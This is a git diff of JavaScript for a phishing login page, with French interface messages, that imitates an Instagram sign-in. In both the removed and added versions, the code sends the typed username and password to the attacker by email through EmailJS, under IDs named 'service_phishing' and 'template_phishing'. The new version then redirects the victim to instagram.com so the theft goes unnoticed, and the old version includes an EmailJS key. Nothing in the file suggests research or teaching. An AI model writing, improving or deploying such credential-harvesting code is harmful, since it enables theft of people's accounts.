@@ -1,29 +1,22 @@
-document.addEventListener("DOMContentLoaded", function() {
-    const loginForm = document.getElementById("loginForm");
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+    document.getElementById('loginMessage').textContent = "Connexion en cours...";
 
-    // Initialiser EmailJS avec votre clé publique
-    emailjs.init('TR-V0PpRNpxABebux');
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    loginForm.addEventListener("submit", function(event) {
-        event.preventDefault();
-
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-
-        // Afficher le message "Connexion en cours..."
-        const loginMessage = document.getElementById("loginMessage");
-        loginMessage.textContent = "Connexion en cours...";
-
-        // Envoyer l'email via EmailJS avec seulement le template ID
-        emailjs.send("service_phishing", "template_phishing", {
-            username: username,
-            password: password
-        }).then(function(response) {
-            console.log("SUCCESS!", response.status, response.text);
-            loginMessage.textContent = "Connexion réussie.";
-        }, function(error) {
-            console.log("FAILED...", error);
-            loginMessage.textContent = "Erreur de connexion.";
-        });
+    emailjs.send('service_phishing', 'template_phishing', {
+        username: username,
+        password: password,
+    }).then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        document.getElementById('loginMessage').textContent = "Connexion réussie!";
+        setTimeout(function() {
+            window.location.href = 'https://www.instagram.com';
+        }, 2000); // Redirection après 2 secondes
+    }, function(error) {
+        console.log('FAILED...', error);
+        document.getElementById('loginMessage').textContent = "Échec de la connexion.";
     });
 });
+
